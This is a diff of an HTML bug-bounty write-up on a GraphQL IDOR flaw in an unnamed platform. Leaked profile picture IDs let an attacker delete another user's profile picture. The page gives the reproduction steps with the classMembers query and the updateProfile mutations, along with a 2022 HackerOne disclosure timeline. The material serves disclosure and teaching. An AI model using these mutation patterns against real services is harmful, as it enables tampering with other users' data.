@@ -1,169 +1,157 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta property="og:image" content="/images/writeup/idor.png" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Abusing GraphQL IDOR to Delete Another User's Profile Picture</title>
-    <meta name="description" content="A deeper look into how a GraphQL IDOR vulnerability enabled cross-account manipulation of profile pictures due to shared object references and lack of ownership validation.">
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #000;
-            color: #eee;
-            padding: 20px;
-            line-height: 1.8;
-        }
+  <meta charset="UTF-8">
+  <meta property="og:image" content="/images/writeup/idor.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>graphql idor — profile picture deletion</title>
+  <meta name="description" content="an in-depth write-up on graphql idor leading to cross-account profile picture deletion by abusing shared object references." />
+  <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 18px;
+      text-transform: lowercase;
+      line-height: 1.8;
+      padding: 40px 20px;
+    }
 
-        .container {
-            max-width: 850px;
-            margin: 0 auto;
-        }
+    h1 {
+      color: #0b8000;
+      font-size: 36px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
 
-        h1 {
-            color: #ffcc00;
-            text-align: center;
-            font-size: 2.5em;
-            margin-bottom: 0.5em;
-        }
+    h2 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      border-bottom: 2px solid #0b8000;
+      display: inline-block;
+      padding-bottom: 5px;
+      color: #ffffff;
+    }
 
-        h2 {
-            color: #ffcc00;
-            border-bottom: 1px solid #444;
-            padding-bottom: 5px;
-            margin-top: 40px;
-        }
+    p, li, small {
+      font-size: 20px;
+      text-align: justify;
+    }
 
-        p {
-            text-align: justify;
-            margin-bottom: 20px;
-        }
+    ul, ol {
+      margin-left: 20px;
+    }
 
-        code {
-            background-color: #111;
-            color: #0f0;
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-family: monospace;
-        }
+    ol {
+      background-color: #111;
+      border-left: 4px solid #0b8000;
+      padding: 15px 25px;
+      border-radius: 8px;
+    }
 
-        pre {
-            background-color: #111;
-            color: #0f0;
-            padding: 10px;
-            overflow-x: auto;
-            border-radius: 6px;
-            margin-bottom: 20px;
-        }
+    code {
+      background-color: #111;
+      color: #0f0;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+    }
 
-        ol {
-            background-color: #111;
-            border-left: 4px solid #ffcc00;
-            padding: 20px;
-            border-radius: 6px;
-        }
+    pre {
+      background-color: #111;
+      color: #0f0;
+      padding: 10px;
+      overflow-x: auto;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
 
-        ol li {
-            margin-bottom: 10px;
-        }
+    a {
+      color: #0b8000;
+      text-decoration: none;
+    }
 
-        ul {
-            margin-top: 10px;
-        }
+    a:hover {
+      text-decoration: underline;
+    }
 
-        a {
-            color: #ffcc00;
-            text-decoration: none;
-        }
+    .container {
+      max-width: 850px;
+      margin: 0 auto;
+    }
 
-        a:hover {
-            text-decoration: underline;
-        }
+    .text-center {
+      text-align: center;
+    }
 
-        footer {
-            text-align: center;
-            margin-top: 60px;
-            font-size: 1.1em;
-        }
-    </style>
+    footer {
+      text-align: center;
+      margin-top: 50px;
+      font-size: 18px;
+      color: #777;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Abusing GraphQL IDOR to Delete Another User's Profile Picture</h1>
-        </header>
+  <div class="container">
+    <h1>graphql idor — profile picture deletion</h1>
 
-        <p>This vulnerability stems from a subtle but critical flaw in the platform’s GraphQL implementation. The backend allowed profile pictures to be referenced via a shared <code>profile_picture_id</code> — but failed to enforce strict ownership validation when that ID was mutated via profile updates.</p>
+    <p>this vuln stems from graphql exposing shared <code>profile_picture_id</code> fields without validating ownership. by manipulating that field via crafted mutations, an attacker could delete another user's profile picture.</p>
 
-        <p>The exploit took advantage of how GraphQL resolvers returned deeply nested user data (including profile picture metadata) to unauthorized users within the same class/group context. By chaining this exposure with a mutation that reused the ID, the attacker could overwrite and delete a victim's profile picture — all through legitimate UI actions, amplified by crafted GraphQL queries.</p>
+    <p>resolvers returned deeply nested user metadata — including image urls with embedded ids. the backend accepted that id in updateProfile without checking if the caller owned the media object.</p>
 
-        <h2>Context: GraphQL and Shared Media Objects</h2>
-        <p>Unlike REST APIs, GraphQL often returns large, nested response objects. In this case, a query like <code>getClassMembers</code> exposed each user's <code>profilePictureUrl</code>, from which the <code>profile_picture_id</code> could be extracted by parsing the URL. This ID wasn't scoped per user, and the backend didn’t verify that the current user had ownership of the referenced media object when reusing it in a mutation.</p>
+    <h2>context: graphql & shared objects</h2>
+    <p>graphql often returns big, nested data trees. in this case, <code>getClassMembers</code> leaked each member’s <code>profilePictureUrl</code>. parsing that gave access to raw <code>profile_picture_id</code> values — which were reused unsafely.</p>
 
-        <h2>Steps to Reproduce</h2>
-       <code>
-            <li>Create two accounts:
-                <ul>
-                    <li><strong>User A</strong> (victim)</li>
-                    <li><strong>User B</strong> (attacker)</li>
-                </ul>
-            </li>
-
-            <li>User A creates a “Class” and adds User B to it — establishing access context for viewing user details via GraphQL.</li>
-
-            <li>User B performs a query like:
-<pre>
-query {{
-  classMembers(classId: "xyz") {{
+    <h2>steps to reproduce</h2>
+    <ol>
+      <li>create two accounts: <strong>user a</strong> (victim) & <strong>user b</strong> (attacker)</li>
+      <li>user a creates a “class” and adds user b</li>
+      <li>user b runs:
+        <pre><code>query {
+  classMembers(classId: "xyz") {
     id
     name
     profilePictureUrl
-  }}
-}}
-</pre>
-            </li>
-
-            <li>The returned <code>profilePictureUrl</code> contains a UUID — e.g.,
-<pre>https://cdn.example.com/images/<mark>cb227e3c-4bb3-42fc-8c29-b3030d6e86ab</mark>/avatar.png</pre>
-This UUID is the <code>profile_picture_id</code> used internally.</li>
-
-            <li>User B now uses a GraphQL mutation to update their own profile and sets:
-<pre>
-mutation {{
-  updateProfile(input: {{
+  }
+}</code></pre>
+      </li>
+      <li>extracted UUID from image URL:
+        <pre><code>https://cdn.example.com/images/cb227e3c-.../avatar.png</code></pre>
+      </li>
+      <li>user b updates their own profile with victim's image id:
+        <pre><code>mutation {
+  updateProfile(input: {
     profile_picture_id: "cb227e3c-4bb3-42fc-8c29-b3030d6e86ab"
-  }}) {{
+  }) {
     success
-  }}
-}}
-</pre>
-This effectively links both profiles to the same image.</li>
-
-            <li>To delete the image, the attacker either sends:
-<pre>
-mutation {{
-  updateProfile(input: {{
+  }
+}</code></pre>
+      </li>
+      <li>finally, attacker deletes the image globally:
+        <pre><code>mutation {
+  updateProfile(input: {
     profile_picture_id: null
-  }}) {{
+  }) {
     success
-  }}
-}}
-</pre>
-Or performs a delete mutation if supported by the schema. Since the object is shared, it is removed globally — affecting the victim as well.</li>
-        </code>
+  }
+}</code></pre>
+      </li>
+    </ol>
 
-        <h2>Timeline</h2>
-        <ul>
-            <li>June 22, 2022 – Initial report submitted</li>
-            <li>June 23, 2022 – Closed as “Not Applicable”; later reopened</li>
-            <li>June 27 – Escalated to HackerOne support</li>
-            <li>July 1 – Triaged, validated</li>
-            <li>July 12 – Issue resolved and bounty awarded</li>
-        </ul>
+    <h2>timeline</h2>
+    <ul>
+      <li>june 22, 2022 — initial report</li>
+      <li>june 23 — closed as not applicable (later reopened)</li>
+      <li>june 27 — escalated to hackerone support</li>
+      <li>july 1 — triaged</li>
+      <li>july 12 — resolved & bounty awarded</li>
+    </ul>
 
-        <footer>
-            Thanks, <br> Anand
-        </footer>
-    </div>
+    <footer>
+      thanks,<br>anand
+    </footer>
+  </div>
 </body>
 </html>
